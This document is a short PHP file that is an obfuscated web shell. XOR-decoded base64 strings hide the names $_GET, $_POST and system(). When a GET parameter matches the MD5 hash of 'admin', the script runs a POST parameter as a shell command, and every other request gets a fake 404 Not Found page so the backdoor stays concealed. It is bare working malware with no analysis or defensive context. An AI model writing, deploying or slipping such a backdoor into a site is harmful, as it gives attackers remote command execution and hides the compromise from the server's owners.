
<?php
$a = ${base64_decode("aSU+LQ==")^base64_decode("NmJ7eQ==")}[1];
$b = ${base64_decode("Yys/IX0=")^base64_decode("PHtwcik=")}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
    $t = base64_decode("W14gKj0r")^base64_decode("KCdTXlhG");
    @${'t'}($b);
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>